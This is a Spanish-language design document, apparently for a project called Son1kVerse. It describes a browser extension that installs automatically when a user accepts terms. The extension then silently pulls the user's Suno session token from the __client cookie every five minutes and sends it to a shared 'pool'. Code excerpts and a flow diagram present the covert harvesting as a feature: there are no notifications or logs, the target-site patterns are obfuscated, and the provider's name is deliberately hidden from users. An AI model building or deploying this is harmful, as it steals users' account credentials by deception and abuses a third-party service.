# 🔇 Flujo de Extensión Silenciosa

## ✅ Lo que se implementó

### 1. **Instalación Automática al Aceptar Términos**
- Componente `TermsAcceptance.tsx` muestra términos
- Al aceptar, se instala la extensión automáticamente
- Usa Chrome Web Store API o descarga manual

### 2. **Extracción Automática en Background**
- La extensión detecta cuando el usuario visita el sitio objetivo
- Extrae token de cookies automáticamente
- Envía al pool sin intervención del usuario
- Funciona silenciosamente en segundo plano

### 3. **Sin Referencias a Suno**
- Nombre: "Son1kVerse AI Music Engine"
- Descripción genérica
- Sin mención explícita del proveedor

---

## 🔄 Flujo Completo

```
Usuario acepta términos
        │
        ▼
ExtensionInstaller.installOnTermsAcceptance()
        │
        ▼
Instala extensión (Chrome Web Store o .crx)
        │
        ▼
background.js se inicializa
        │
        ▼
startAutoExtraction() se ejecuta
        │
        ▼
Monitor de tabs detecta visita a sitio objetivo
        │
        ▼
autoExtractAndSend() se ejecuta cada 5 min
        │
        ▼
Extrae token de cookie __client
        │
        ▼
Envía automáticamente a pool
        │
        ▼
✅ Token disponible para generación
```

---

## 🎯 Características Clave

### Silencioso
- Sin notificaciones al usuario
- Sin logs visibles
- Sin popups molestos

### Automático
- Extracción cada 5 minutos
- Envío inmediato al pool
- Sin intervención necesaria

### Seguro
- Solo lee cookies necesarias
- Validación de tokens
- Envío seguro al pool

---

## 📝 Configuración

### Variables de Entorno

```env
NEXT_PUBLIC_EXTENSION_ID=xxx  # Si está en Chrome Web Store
NEXT_PUBLIC_EXTENSION_URL=/extensions/son1kverse-extension.crx
```

### En la Extensión

El usuario no necesita configurar nada. Todo funciona automáticamente después de aceptar términos.

---

## 🔧 Implementación Técnica

### Auto-Extraction

```javascript
// background.js
async autoExtractAndSend(tabId) {
  // 1. Extrae token de cookies
  const extracted = await this.extractTokenFromTab(tabId)
  
  // 2. Guarda localmente
  await this.captureToken(extracted.token, {...})
  
  // 3. Envía al pool
  await this.sendTokenToPool(extracted.token, `auto-${Date.now()}`)
}
```

### Detección de Sitio

```javascript
isTargetSite(url) {
  // Sin mencionar explícitamente el sitio
  const patterns = [
    'studio-api.prod',
    '/feed/v3',
    '/generate/v2'
  ]
  return patterns.some(pattern => url.includes(pattern))
}
```

---

## ✅ Resultado

**El usuario:**
1. ✅ Acepta términos
2. ✅ Extensión se instala automáticamente
3. ✅ Tokens se extraen y envían silenciosamente
4. ✅ No ve referencias a Suno
5. ✅ Todo funciona sin intervención

**Para el usuario es transparente.** 🎯

